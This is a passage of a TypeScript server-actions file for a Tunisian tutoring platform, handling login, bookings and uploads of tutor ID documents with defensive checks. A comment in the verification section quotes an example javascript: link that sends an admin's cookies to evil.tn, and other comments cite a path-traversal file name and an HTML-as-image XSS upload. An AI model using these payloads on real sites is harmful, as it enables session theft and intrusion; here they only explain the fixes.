"use server";
import { eq, and, or, ne, sql, desc, ilike, inArray, isNull } from "@tnajem/db";
import { db, dbReady } from "@/lib/db";
import {
  profiles, tutors, classes, packs, bookings, consents, verificationDocs, reviews, notifications,
} from "@tnajem/db";
import { writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";
import {
  normalizePhone, isValidPhone, createOtp, verifyOtpCode, otpCooldownRemaining,
  createSession, destroySession, getSession, setDemoCookie, checkRateLimit, clientIp,
  setRoleHint, otpChannel, normalizeEmail, isValidEmail,
  OTP_RESEND_COOLDOWN_SEC, OTP_TTL_SEC, adoptSession,} from "@/lib/auth";
import { demoClasses, demoEnabled } from "@/lib/demo";
import { revalidateTutor, revalidatePublicTutors } from "@/lib/cache";
import { smsEnabled, sendSms } from "@tnajem/shared/sms";
import { mailEnabled, sendMail } from "@tnajem/shared/mail";
/* notify now takes a db handle (it moved to @tnajem/db so apps/api can use the
   SAME implementation). Bound here so the ~8 call sites below are unchanged. */
import { notify as notifyWith } from "@tnajem/db";
const notify = (profileId: string, input: Parameters<typeof notifyWith>[2]) =>
  notifyWith(db, profileId, input);
import { requireAdmin, adminNotifyEmails } from "@/lib/admin";
import { call, callAnonymous } from "@/lib/api";
import { demoFallback } from "@/lib/backend";
import { paymentsEnabled, tutorBalanceTnd } from "@tnajem/shared/payments";
import { liveRoomUrl, resolveMeetUrl } from "@tnajem/shared/live";
import {
  vText, vOptionalText, vInt, vPrice, vFutureDate, vOptionalUrl, vSlug, vRating, vPhone,
  vUuid, isUuid, safeFileName, vBirthYear, isMinorBirthYear, vOptionalPhone,
} from "@tnajem/shared";
import type {
  DashboardData, DashboardBooking, StudentDashboard, ClassItem, TutorVerification, PendingTutor,
  ExploreTutor, TutorReviews, NotificationItem, NotificationKind, DashboardResult,
  StudentLevel, Role, OnboardingState,
} from "@tnajem/shared";
import { STUDENT_LEVELS, parseStudentProfile } from "@tnajem/shared";
import type { Me } from "@tnajem/shared";

type DocKind = "id_front" | "id_back" | "selfie" | "diploma" | "certificate" | "role_proof" | "other";

/* Read once. Every "may we leak this to the client?" decision in this file keys off
   it, and a single named constant is easier to audit than scattered string compares. */
const IS_PROD = process.env.NODE_ENV === "production";

const DASH_MONTHS = ["JANV", "FÉVR", "MARS", "AVR", "MAI", "JUIN", "JUIL", "AOÛT", "SEPT", "OCT", "NOV", "DÉC"];
const CANCEL_WINDOW_MS = 24 * 60 * 60 * 1000; // the UI promises free cancellation up to 24h before

/* Server actions = the write/auth path. Callable from client components.
   In demo mode (no DATABASE_URL) they degrade gracefully so the UI still works.
   Every input goes through lib/validation.ts — actions are a public surface. */

export type ActionResult = { ok: boolean; demo?: boolean; slug?: string; error?: string };

/* publicName and initials moved to @tnajem/shared (validation.ts) when the tutors
   domain was ported. They are NOT re-declared here: publicName is a security
   boundary, not formatting -- it is what keeps a reviewer's full name off a
   public, unauthenticated page -- and two copies of a security boundary that
   nothing forces to agree is precisely the bug that had the admin allowlist tested
   in one place and running in another. */

/* recomputeTutorStats moved to apps/api/src/lib/stats.ts. It ran INSIDE the
   transactions of reserveSeat, cancelBooking and createReview, so it had to move
   before them — splitting it across processes would have broken the transaction
   they share and resurrected the lost-update race. All three are ported now, so
   the web copy is dead and is deleted rather than left to drift. */


/* ---------- Auth (OTP) ----------

   THE CODE GOES TO AN EMAIL ADDRESS. It used to be an SMS, and the SMS path is
   still right here, live and compiling, behind otpChannel() — set OTP_CHANNEL=sms
   and phone login is back with no code change. It is not commented out on purpose:
   commented code is invisible to tsc and to the audit gates, so it silently rots.

   WHY WE MOVED: every SMS costs money, and reliable delivery to Tunisian numbers
   needs a registered alphanumeric sender ID. Until that exists smsEnabled() is
   false and this action only ever returns the code on-screen in dev — meaning a
   real deploy had no working login at all. */

/* The email itself. Kept next to the SMS wording it replaces, and localised:
   sending a French email to someone using the Arabic site is a small betrayal of
   the only bilingual promise the product makes. Plain text — a six-digit code
   needs no layout, and text-only bodies are the least likely to be held back by a
   spam filter, which for an OTP is the whole product. */
/* OTP_MAIL moved to apps/api/src/lib/otp-copy.ts with the sender. */

/* `resendAfter` / `expiresIn` (seconds) travel with every successful send so the
   login screens can count down the cooldown and the code's life WITHOUT keeping
   their own copy of either constant — see the note on them in lib/auth.ts. */
export async function requestOtp(input: { identifier: string; locale?: string }):
  Promise<{
    ok: boolean; devCode?: string; demo?: boolean; error?: string; retryAfter?: number;
    resendAfter?: number; expiresIn?: number;
  }> {
  if (demoFallback) {
    /* Demo mode (no DATABASE_URL) — the UI-audit harness and local preview. The
       sentinel code is still withheld in production: a prod deploy that lost its
       DATABASE_URL must degrade to "can't sign in", never to "sign in as anyone".
       Kept on the WEB side because it exists to keep `next build` and the audit
       harness working without a database; apps/api asserts DATABASE_URL at boot. */
    return IS_PROD
      ? { ok: false, error: "send-failed" }
      : { ok: true, demo: true, devCode: "000000", resendAfter: OTP_RESEND_COOLDOWN_SEC, expiresIn: OTP_TTL_SEC };
  }
  // PORTED to apps/api (POST /auth/otp/request). Rate limits, the advisory-locked
  // mint and delivery all live there now.
  return call("/auth/otp/request", input);
}

export async function verifyOtp(input: { identifier: string; code: string; role?: "tutor" | "student"; locale?: string; birthYear?: number }):
  Promise<{ ok: boolean; role?: string; needsConsent?: boolean; created?: boolean; roleMismatch?: boolean; needsProfile?: boolean; hasStorefront?: boolean; error?: string; retryAfter?: number }> {
  if (demoFallback) {
    setDemoCookie(input.role === "tutor" ? "tutor" : "student");
    const demoRole = input.role ?? "student";
    // Demo mode mirrors the real gate: a student is a minor unless they gave an
    // adult birth year, in which case consent is skipped.
    const demoMinor = input.role === "student" && isMinorBirthYear(vBirthYear(input.birthYear));
    // Demo has no stored profile, so every run looks like a fresh signup that still
    // needs the welcome screen — which is exactly what we want to be able to audit.
    return {
      ok: true, role: demoRole, needsConsent: demoMinor,
      created: true, roleMismatch: false, needsProfile: demoRole === "student",
    };
  }

  /* PORTED to apps/api (POST /auth/otp/verify). Everything that decides identity
     — normalisation, the two throttles, code verification, profile creation, the
     consent gate — runs there.

     The COOKIES stay here, and must. apps/api is talking to this server, not to
     the browser, so it returns the token it minted and we write it. The role hint
     is web-only by design: it is a forgeable UI hint that decides one nav link,
     and the API has no business knowing it exists. */
  const res = await call<{
    ok: boolean; role?: string; needsConsent?: boolean; created?: boolean;
    roleMismatch?: boolean; needsProfile?: boolean; hasStorefront?: boolean;
    error?: string; retryAfter?: number;
    session?: { token: string; expiresAt: string };
  }>("/auth/otp/verify", input);

  if (res.ok && res.session) {
    adoptSession(res.session.token, new Date(res.session.expiresAt), res.role);
  }
  const { session: _session, ...rest } = res;
  return rest;
}

export async function logout(): Promise<{ ok: boolean }> {
  /* The API deletes the row; this clears the cookies. Both halves matter: a
     cleared cookie with a live row means anyone holding the token is still signed
     in, and a deleted row with a live cookie means the browser keeps sending a
     token that no longer resolves. destroySession() does the cookie half. */
  if (dbReady) {
    try {
      await call("/auth/logout");
    } catch {
      /* An API outage must not strand someone signed in on this browser. Clearing
         the cookie is the half we can always do; the row expires on its own and
         is swept by the purge. */
    }
  }
  await destroySession();
  return { ok: true };
}

export async function saveConsent(input: { guardianName: string; guardianPhone: string }): Promise<ActionResult> {
  if (demoFallback) return { ok: true, demo: true };
  // PORTED to apps/api (POST /consent). One consent row per minor, updated in place.
  return call<ActionResult>("/consent", input);
}

/* ---------- Role: the one and only student → tutor upgrade ----------

   This is the ONLY place in the codebase that writes `profiles.role = 'tutor'`
   after signup. createTutor() used to do it as a side effect of saving a name; see
   the ROLE GATE comment there for why that was the whole problem.

   Three things it insists on, in order:

     1. AN EXPLICIT CONFIRMATION. `confirm` is not ceremony — it is the difference
        between a role change the user asked for and one that happened to them. The
        /onboarding/upgrade screen is what sets it.

     2. THE CURRENT ROLE IS `student`. A tutor calling this is a no-op success
        (idempotent, so a double-submit or a stale tab cannot fail); anything else
        is refused rather than coerced.

     3. THE USER IS AN ADULT. A tutor is ID-verified and then teaches children, so a
        minor must never hold the role. Age is only ever known for students (we
        collect a birth year at student signup and nowhere else), and it fails safe:
        an unknown age is NOT waved through — the caller is asked for it and it is
        persisted here. isMinorBirthYear treats null as minor, so the refusal below
        catches both "too young" and "still unknown after we asked".

   Role changes must also refresh ROLE_HINT_COOKIE or <SiteHeader> renders the old
   role for the rest of the session's 30 days — hence setRoleHint(). */
export async function becomeTutor(input: { confirm: boolean; birthYear?: number }): Promise<ActionResult> {
  if (!input?.confirm) return { ok: false, error: "not-confirmed" };

  if (demoFallback) {
    setDemoCookie("tutor"); // demo has no profile row; the cookie IS the state
    return { ok: true, demo: true };
  }

  /* PORTED to apps/api (POST /profile/become-tutor). The rate limit, the age rule
     and the role write all live there.

     setRoleHint stays HERE: it writes a cookie on the browser, which the API
     cannot do, and it is a forgeable UI hint the API has no business knowing
     about. The endpoint returns the new role so we know when to set it. */
  const res = await call<ActionResult & { role?: string }>("/profile/become-tutor", input);
  if (res.ok && res.role) setRoleHint(res.role);
  return { ok: res.ok, error: res.error };
}

export async function saveStudentProfile(
  input: { fullName: string; level?: string | null; subjects?: string[]; phone?: string | null },
): Promise<ActionResult> {
  /* Validation runs BEFORE the demo short-circuit, exactly as it always has, so
     the ui-audit harness can exercise the error states with no database. It uses
     parseStudentProfile from @tnajem/shared — the SAME function the API handler
     calls, not a copy. */
  if (demoFallback) {
    const check = parseStudentProfile(input);
    return check.ok ? { ok: true, demo: true } : { ok: false, error: check.error };
  }
  // PORTED to apps/api (POST /profile/student).
  return call<ActionResult>("/profile/student", input);
}

export async function getMe(): Promise<Me | null> {
  return call<Me | null>("/me", undefined, "GET");
}

/* ---------- Tutor storefront (bound to the signed-in user) ---------- */
export async function createTutor(input: { name: string; subject: string; bio: string; slug: string; phone?: string | null }): Promise<ActionResult> {
  if (demoFallback) {
    /* Demo mode still validates the slug so the audit harness can exercise the
       reserved/taken states. vSlug is the same function the API calls. */
    const slug = vSlug(input.slug);
    return slug.ok ? { ok: true, demo: true, slug: slug.value } : { ok: false, error: slug.error };
  }
  /* PORTED to apps/api (POST /tutors). The role gate, the WRITE-ONCE slug rule and
     the collision check all live there.

     call() replays the `revalidate` envelope the endpoint returns — revalidateTag
     only works inside a Next request scope, so cache busting cannot move to the
     API. See apps/web/lib/api.ts rule 4. */
  return call<ActionResult>("/tutors", input);
}

export async function getOnboardingState(): Promise<OnboardingState | null> {
  if (demoFallback) return null;
  // PORTED to apps/api (GET /profile/onboarding).
  return call<OnboardingState | null>("/profile/onboarding", undefined, "GET");
}

export async function createClass(input: {
  title: string; description?: string; scheduledAt: string;
  durationMin: number; priceTnd: number; seats: number; isFreeFirst: boolean;
  meetUrl?: string; whiteboardUrl?: string; quizUrl?: string;
}): Promise<ActionResult> {
  if (demoFallback) return { ok: true, demo: true };
  /* PORTED to apps/api (POST /classes). The validators, the verification gate and
     the insert all live there; call() replays the revalidate envelope. */
  return call<ActionResult>("/classes", input);
}

export async function createPack(input: { title: string; meta?: string; priceTnd: number }): Promise<ActionResult> {
  if (demoFallback) return { ok: true, demo: true };
  // PORTED to apps/api (POST /packs).
  return call<ActionResult>("/packs", input);
}

/* ---------- Dashboard (real data for the signed-in tutor) ----------
   Returns null in demo mode or when signed out → the dashboard then shows
   its demo preview. Otherwise returns the tutor's real storefront + classes. */
export async function getDashboard(): Promise<DashboardResult> {
  if (demoFallback) return null;
  // PORTED to apps/api (GET /dashboard).
  return call<DashboardResult>("/dashboard", undefined, "GET");
}

/* ---------- Booking (student reserves a seat — free first session) ----------
   Payment-free for the pilot: reserves a seat and decrements availability.
   Idempotent — re-booking the same class returns { already: true }. */
export async function reserveSeat(input: { classId: string }):
  Promise<{ ok: boolean; demo?: boolean; already?: boolean; error?: string }> {
  if (demoFallback) return { ok: true, demo: true };
  /* PORTED to apps/api (POST /bookings).

     The atomic seat claim, the guardian-consent gate, the verification gate, the
     rate limit and the post-commit notifications all moved together — as did
     recomputeTutorStats, which runs INSIDE that transaction. Splitting them across
     processes would have resurrected the lost-update race.

     call() replays the revalidate envelope: seats_left just moved and the
     storefront caches it for 60s, so a class the cache still shows as "3 places"
     is how a student reaches the checkout of a sold-out session. */
  return call<{ ok: boolean; already?: boolean; error?: string }>("/bookings", input);
}

/* ---------- Cancellation (student) ----------
   The UI promises "annulation gratuite jusqu'à 24h avant" — enforce it here, not
   just in copy. Frees the seat back up and tells the tutor. */
export async function cancelBooking(input: { bookingId: string }): Promise<ActionResult> {
  if (demoFallback) return { ok: true, demo: true };
  /* PORTED to apps/api (POST /bookings/cancel). The 24h window is enforced against
     SERVER time there, the seat release is atomic (status flip as the WHERE guard,
     so only one writer can decrement), and the IDOR check on booking ownership
     moved with it. */
  return call<ActionResult>("/bookings/cancel", input);
}

/* ---------- Student dashboard (real reservations) ----------
   Returns null in demo mode / signed out → the student page shows demo data. */
export async function getStudentDashboard(): Promise<StudentDashboard | null> {
  if (demoFallback) return null;
  // PORTED to apps/api (GET /student/dashboard).
  return call<StudentDashboard | null>("/student/dashboard", undefined, "GET");
}

/* ---------- Single class read (for class detail / checkout / live) ----------
   Demo mode → demo class; real mode → the row by id, or null if missing. */
export async function getClass(id: string): Promise<ClassItem | null> {
  if (demoFallback) return demoEnabled ? (demoClasses.find((c) => c.id === id) ?? null) : null;
  /* PORTED to apps/api (GET /classes/:id).

     call(), not callAnonymous: the entitlement check needs the session — meet_url
     ships ONLY to the owning tutor or a student with a live booking, and it is the
     only thing protecting a live room full of minors.

     This is safe to make session-dependent because getClass is invoked from CLIENT
     components only. If anyone ever renders it from a server component on a cached
     route, the entitlement decision gets baked into cached HTML. That invariant is
     currently held by convention; e2e asserts the anonymous case. */
  return call<ClassItem | null>(`/classes/${encodeURIComponent(id)}`, undefined, "GET");
}

/* ===================== Tutor verification =====================
   Identity (ID) is required; diploma/experience/links are optional trust
   boosters. On submit the tutor goes to "pending" (hidden from Explore +
   public storefront) until an admin approves. Files are stored on local disk
   under ./.storage (gitignored) — swap for a cloud bucket in production. */

// STORAGE_DIR points at a persistent volume in prod (e.g. /var/data on Render);
// falls back to a local ./.storage folder in dev.
const STORAGE_BASE = process.env.STORAGE_DIR || join(process.cwd(), ".storage");
const STORAGE_ROOT = join(STORAGE_BASE, "verification");
const MAX_DOC_BYTES = 8 * 1024 * 1024; // 8 MB per file
const OK_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;
const DOC_FIELDS: { field: string; kind: DocKind; required?: boolean }[] = [
  { field: "idFront", kind: "id_front", required: true },
  { field: "idBack", kind: "id_back" },
  { field: "selfie", kind: "selfie" },
  { field: "diploma", kind: "diploma" },
  { field: "certificate", kind: "certificate" },
  { field: "roleProof", kind: "role_proof" },
];
const MAX_DOCS_PER_TUTOR = 24; // ~4 rounds of the 6 fields — a resubmit budget, not a bucket

/* Content sniffing. `File.type` is just the Content-Type the CLIENT put in the
   multipart part — it is attacker-chosen and proves nothing. The OK_MIME check
   above therefore only ever established what the uploader CLAIMED. Since the admin
   doc route streams these bytes back with that same claimed type, "HTML file
   labelled image/png" was a stored-XSS payload aimed at the one session that can
   read every tutor's national ID scan.

   So: verify the magic bytes. If the header doesn't match a format we accept, the
   upload is refused — regardless of what the client called it. Cheap, dependency-free,
   and it also stops polyglots from being written to disk in the first place. */
function sniffMime(buf: Buffer): string | null {
  if (buf.length < 12) return null;
  // JPEG: FF D8 FF
  if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) return "image/jpeg";
  // PNG: 89 50 4E 47 0D 0A 1A 0A
  if (buf.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]))) return "image/png";
  // PDF: %PDF-
  if (buf.subarray(0, 5).toString("latin1") === "%PDF-") return "application/pdf";
  // RIFF....WEBP
  if (buf.subarray(0, 4).toString("latin1") === "RIFF" && buf.subarray(8, 12).toString("latin1") === "WEBP") {
    return "image/webp";
  }
  // ISO-BMFF (HEIC/HEIF): bytes 4..8 = "ftyp", brand at 8..12
  if (buf.subarray(4, 8).toString("latin1") === "ftyp") {
    const brand = buf.subarray(8, 12).toString("latin1");
    if (["heic", "heix", "hevc", "heim", "heis", "hevm", "mif1", "msf1"].includes(brand)) return "image/heic";
  }
  return null;
}

/* The admin gate lives in lib/admin.ts now — ONE implementation, shared with
   app/api/admin/doc/[id]/route.ts. That route carried a phone-only copy, so
   under email login (the default) every admin got 403 on every ID scan while
   still being shown the queue. The fail-closed history is documented there. */

export async function submitVerification(formData: FormData):
  Promise<{ ok: boolean; demo?: boolean; error?: string; retryAfter?: number }> {
  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return { ok: false, error: "no-storefront" };

  /* Throttle. Each call can write up to 6 × 8 MB and there was NO limit on how
     often you could call it: a signed-in tutor could loop this and fill the disk
     (the same volume the app and every other tutor's documents live on). */
  const rl = await checkRateLimit(`verif:${mine.id}`, 5, 60 * 60_000); // 5 submissions / hour / tutor
  if (!rl.ok) return { ok: false, error: "too-many-requests", retryAfter: rl.retryAfter };

  /* Hard cap on stored documents per tutor. Rate limiting bounds the RATE; this
     bounds the TOTAL, so a patient attacker can't drip-feed the disk full over days.
     Rows are only ever removed by the retention purge (lib/retention.ts). */
  const [{ n: docCount } = { n: 0 }] = await db
    .select({ n: sql<number>`count(*)::int` })
    .from(verificationDocs)
    .where(eq(verificationDocs.tutorId, mine.id));

  // Collect + validate files (idFront required).
  const incoming: { kind: DocKind; file: File; bytes: Buffer; mime: string }[] = [];
  for (const d of DOC_FIELDS) {
    const f = formData.get(d.field);
    if (f instanceof File && f.size > 0) {
      // Size is checked BEFORE we read the body into memory.
      if (f.size > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };
      if (!OK_MIME.test(f.type)) return { ok: false, error: "bad-file-type" };

      const bytes = Buffer.from(await f.arrayBuffer());
      // Belt and braces: a lying Content-Length can't smuggle a bigger body past us.
      if (bytes.length > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };

      // The real gate: what the bytes ACTUALLY are, not what the client claimed.
      const sniffed = sniffMime(bytes);
      if (!sniffed || !OK_MIME.test(sniffed)) return { ok: false, error: "bad-file-type" };

      incoming.push({ kind: d.kind, file: f, bytes, mime: sniffed });
    } else if (d.required) {
      return { ok: false, error: "id-required" };
    }
  }

  if (docCount + incoming.length > MAX_DOCS_PER_TUTOR) {
    return { ok: false, error: "too-many-documents" };
  }

  /* Persist. Files land under STORAGE_DIR/verification/<tutorId>/ — outside
     /public, so nothing here is ever served statically; the only reader is the
     admin-gated route in app/api/admin/doc/[id]. `mine.id` comes from the session's
     own tutor row, so a tutor can only ever write into their OWN folder. */
  const dir = join(STORAGE_ROOT, mine.id);
  await mkdir(dir, { recursive: true });
  for (const { kind, bytes, mime, file } of incoming) {
    // safeFileName() strips directory components and everything outside
    // [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to a
    // flat, inert name. The kind + timestamp prefix keeps it unique and non-guessable-ish.
    const safe = `${kind}-${Date.now()}-${safeFileName(file.name, 60)}`;
    await writeFile(join(dir, safe), bytes);
    await db.insert(verificationDocs).values({
      tutorId: mine.id,
      kind,
      // Store the SANITIZED name: this string is echoed into a Content-Disposition
      // header by the admin doc route, and the raw client name could carry CR/LF.
      fileName: safeFileName(file.name, 60),
      /* POSIX separators, ALWAYS. node:path.join is platform-dependent, so this
         column filled up with "verification\<id>\<file>" on Windows and
         "verification/<id>/<file>" on Linux — the same logical path stored two
         ways. Both readers split on /[\/]+/ so it resolved either way, but the
         stored value was not canonical: any future consumer that uses it verbatim
         (a URL, a LIKE query, a join) silently misses half the rows.
         scripts/sql/0006 normalises the rows that already exist. */
      storagePath: ["verification", mine.id, safe].join("/"),
      mime,                 // the SNIFFED type — never the client's claim
      sizeBytes: bytes.length,
    });
  }

  /* Text + link fields.

     BUG (fixed): these were written straight through with a bare
     `typeof v === "string" ? v.trim() : null` — no length bound and, more
     importantly, NO URL VALIDATION, unlike createClass which runs vOptionalUrl on
     meetUrl. The seven *Url fields land in the tutors row, come back out through
     getPendingVerifications()/getMyVerification(), and are rendered as <a href> on
     the admin review page and the tutor's own page. A tutor submitting
     `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" was
     therefore planting a link that fires in the ADMIN's authenticated origin — the
     one session that can read every national ID scan in the system.

     vOptionalUrl enforces an http/https scheme allow-list (lib/validation.ts), which
     is exactly what kills javascript:, data: and file:. Text fields get bounded too. */
  const textField = (k: string, max: number) => vOptionalText(formData.get(k), { field: k, max });
  const urlField = (k: string) => vOptionalUrl(formData.get(k), { field: k, max: 300 });

  const institution = textField("institution", 160);
  if (!institution.ok) return { ok: false, error: institution.error };
  const languages = textField("languages", 120);
  if (!languages.ok) return { ok: false, error: languages.error };
  const pitch = textField("pitch", 1000);
  if (!pitch.ok) return { ok: false, error: pitch.error };

  const linkedin = urlField("linkedinUrl");
  if (!linkedin.ok) return { ok: false, error: linkedin.error };
  const instagram = urlField("instagramUrl");
  if (!instagram.ok) return { ok: false, error: instagram.error };
  const tiktok = urlField("tiktokUrl");
  if (!tiktok.ok) return { ok: false, error: tiktok.error };
  const youtube = urlField("youtubeUrl");
  if (!youtube.ok) return { ok: false, error: youtube.error };
  const facebook = urlField("facebookUrl");
  if (!facebook.ok) return { ok: false, error: facebook.error };
  const website = urlField("websiteUrl");
  if (!website.ok) return { ok: false, error: website.error };
  const introVideo = urlField("introVideoUrl");
  if (!introVideo.ok) return { ok: false, error: introVideo.error };

  const yearsRaw = formData.get("experienceYears");
  const years = typeof yearsRaw === "string" && yearsRaw.trim()
    ? Math.max(0, Math.min(60, parseInt(yearsRaw, 10) || 0)) : null;

  await db.update(tutors).set({
    status: "pending", submittedAt: new Date(), reviewNote: null,
    experienceYears: years,
    institution: institution.value, languages: languages.value, pitch: pitch.value,
    linkedinUrl: linkedin.value, instagramUrl: instagram.value, tiktokUrl: tiktok.value,
    youtubeUrl: youtube.value, facebookUrl: facebook.value, websiteUrl: website.value,
    introVideoUrl: introVideo.value,
  }).where(eq(tutors.id, mine.id));

  /* Tell a human. Without this the queue was write-only: a tutor uploaded their
     national ID, several screens told them someone would look at it, and no signal
     of any kind left the database. Email rather than notify(): admins are an env
     allowlist (ADMIN_EMAILS) and may have no profile row to notify, and a review
     promise needs to reach them off-site rather than waiting for them to open a
     page they have no link to.

     Deliberately after the commit and deliberately not awaited into the result: the
     tutor's submission has already succeeded, and a misconfigured mailbox must
     never turn that into an error they cannot act on. Failures are logged loudly
     instead — a silent alerting gap is how the 48h promise quietly stops holding. */
  void notifyAdminsOfSubmission(mine.id, mine.slug, mine.fullName).catch(() => {});

  return { ok: true };
}


async function notifyAdminsOfSubmission(tutorId: string, slug: string, displayName: string): Promise<void> {
  const to = adminNotifyEmails();
  if (!to.length) {
    console.warn(
      "[Tnajem] verification submitted (tutor %s) but ADMIN_EMAILS is empty — nobody was alerted. " +
        "The review queue is at /admin/verifications.",
      tutorId,
    );
    return;
  }
  if (!mailEnabled()) {
    console.warn(
      "[Tnajem] verification submitted (tutor %s) but MAIL_* is not configured — no admin alert sent.",
      tutorId,
    );
    return;
  }
  const site = process.env.NEXT_PUBLIC_SITE_URL ?? "https://tnajem.tn";
  const subject = `Tnajem — nouvelle demande de vérification : ${displayName}`;
  const body =
    `${displayName} (/${slug}) vient d'envoyer ses documents de vérification.\n\n` +
    `File d'attente : ${site}/fr/admin/verifications\n`;
  for (const address of to) {
    const sent = await sendMail(address, subject, body);
    if (!sent) console.error("[Tnajem] admin alert failed for %s (tutor %s)", address, tutorId);
  }
}

export async function getMyVerification(): Promise<TutorVerification | null> {
  if (!dbReady) return null;
  const session = await getSession();
  if (!session) return null;
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return null;
  const docs = await db.select().from(verificationDocs).where(eq(verificationDocs.tutorId, mine.id));
  return {
    status: mine.status,
    experienceYears: mine.experienceYears ?? null,
    institution: mine.institution ?? null,
    languages: mine.languages ?? null,
    pitch: mine.pitch ?? null,
    links: {
      linkedin: mine.linkedinUrl ?? null, instagram: mine.instagramUrl ?? null, tiktok: mine.tiktokUrl ?? null,
      youtube: mine.youtubeUrl ?? null, facebook: mine.facebookUrl ?? null, website: mine.websiteUrl ?? null,
      introVideo: mine.introVideoUrl ?? null,
    },
    reviewNote: mine.reviewNote ?? null,
    docKinds: docs.map((d) => d.kind),
  };
}

export async function getPendingVerifications():
  Promise<{ ok: boolean; admin: boolean; items: PendingTutor[] }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, admin: false, items: [] };

  // Bounded: the review queue is a work list, not an export. Oldest submissions
  // first so nobody's application is starved at the bottom of an unbounded scan.
  const rows = await db
    .select()
    .from(tutors)
    .where(eq(tutors.status, "pending"))
    .orderBy(tutors.submittedAt)
    .limit(100);
  if (rows.length === 0) return { ok: true, admin: true, items: [] };

  /* N+1 (fixed): this ran one verification_docs SELECT per pending tutor inside the
     loop below. At 100 pending applications that was 101 round-trips for one page
     load. Fetch every doc for the batch in a single inArray query and group in memory. */
  const allDocs = await db
    .select()
    .from(verificationDocs)
    .where(inArray(verificationDocs.tutorId, rows.map((t) => t.id)));

  const docsByTutor = new Map<string, typeof allDocs>();
  for (const d of allDocs) {
    const list = docsByTutor.get(d.tutorId);
    if (list) list.push(d);
    else docsByTutor.set(d.tutorId, [d]);
  }

  const items: PendingTutor[] = [];
  for (const t of rows) {
    const docs = docsByTutor.get(t.id) ?? [];
    items.push({
      tutorId: t.id, slug: t.slug, name: t.fullName, subject: t.subject,
      experienceYears: t.experienceYears ?? null, institution: t.institution ?? null,
      languages: t.languages ?? null, pitch: t.pitch ?? null,
      links: {
        linkedin: t.linkedinUrl ?? null, instagram: t.instagramUrl ?? null, tiktok: t.tiktokUrl ?? null,
        youtube: t.youtubeUrl ?? null, facebook: t.facebookUrl ?? null, website: t.websiteUrl ?? null,
        introVideo: t.introVideoUrl ?? null,
      },
      submittedAt: t.submittedAt ? t.submittedAt.toISOString() : null,
      docs: docs.map((d) => ({ id: d.id, kind: d.kind, fileName: d.fileName })),
    });
  }
  return { ok: true, admin: true, items };
}

export async function approveTutor(input: { tutorId: string }): Promise<{ ok: boolean; error?: string }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, error: "forbidden" };
  const tutorId = vUuid(input.tutorId, { field: "tutor" });
  if (!tutorId.ok) return { ok: false, error: "not-found" };

  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
  if (!t) return { ok: false, error: "not-found" };

  // Separation of duties: an admin who also runs a tutor storefront must not be
  // able to verify their own identity documents. A second admin has to sign it off.
  if (t.profileId && t.profileId === session.profile.id) {
    return { ok: false, error: "self-approval-forbidden" };
  }
  // Only a submitted application can be approved — otherwise a draft tutor who
  // never uploaded an ID could be waved through by a misclick.
  if (t.status !== "pending") return { ok: false, error: "not-pending" };

  await db.update(tutors)
    .set({ status: "verified", verified: true, reviewedAt: new Date(), reviewNote: null })
    .where(eq(tutors.id, tutorId.value));

  /* Make the decision effective NOW, not in up to 60s (STOREFRONT_TTL) / an hour
     (SITEMAP_TTL). On approve this is a UX win — the tutor's page and the sitemap
     go live the second the admin clicks. On reject (below) it is a compliance
     control. Both helpers are non-throwing: a cache problem must never roll back
     a decision that is already committed to the database. Done BEFORE notify(),
     which does SMS I/O and is the slow part of this action. */
  revalidateTutor(t.slug);
  revalidatePublicTutors(); // the public set changed → refresh the sitemap

  // The tutor was never told before — they just watched a silent page.
  if (t.profileId) {
    await notify(t.profileId, {
      kind: "verification_approved",
      title: "Profil vérifié ✅",
      body: "Ton profil est validé. Ta page est en ligne et visible dans Explorer.",
      href: "/dashboard",
      sms: `Tnajem : ton profil est vérifié ✅ Ta page tnajem.tn/${t.slug} est en ligne.`,
    });
  }
  return { ok: true };
}

export async function rejectTutor(input: { tutorId: string; note?: string }): Promise<{ ok: boolean; error?: string }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, error: "forbidden" };
  const note = vOptionalText(input.note, { field: "note", max: 500 });
  if (!note.ok) return { ok: false, error: note.error };
  const tutorId = vUuid(input.tutorId, { field: "tutor" });
  if (!tutorId.ok) return { ok: false, error: "not-found" };

  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
  if (!t) return { ok: false, error: "not-found" };

  await db.update(tutors)
    .set({ status: "rejected", verified: false, reviewedAt: new Date(), reviewNote: note.value })
    .where(eq(tutors.id, tutorId.value));

  /* THE COMPLIANCE ONE. getStorefront() returns null for a non-verified tutor and
     the page 404s — but app/[slug]/page.tsx is ISR-cached for 60s, so without this
     the page of a tutor we have just REJECTED (possibly for a failed ID check, on
     a platform used by minors) keeps being served to the public for up to another
     minute, and the sitemap keeps advertising it for up to an hour. The TTL is the
     backstop; this is the control. Non-throwing by design — see approveTutor. */
  revalidateTutor(t.slug);
  revalidatePublicTutors(); // drop them from the cached sitemap too

  if (t.profileId) {
    await notify(t.profileId, {
      kind: "verification_rejected",
      title: "Dossier à compléter",
      body: note.value
        ? `Ton dossier n'a pas été validé : ${note.value}. Tu peux corriger et renvoyer.`
        : "Ton dossier n'a pas été validé. Vérifie tes documents et renvoie ta demande.",
      href: "/onboarding/verify",
      sms: "Tnajem : ton dossier de vérification doit être complété. Détails dans ton espace prof.",
    });
  }
  return { ok: true };
}

/* ---------- Explore feed (real, verified tutors only) ----------
   rating/review_count come from the reviews table, price_from from the tutor's
   cheapest published class. Filters: `subject` (chip) + `q` (free text over name,
   subject, level, bio). Demo mode (no DATABASE_URL) → null so the Explore page
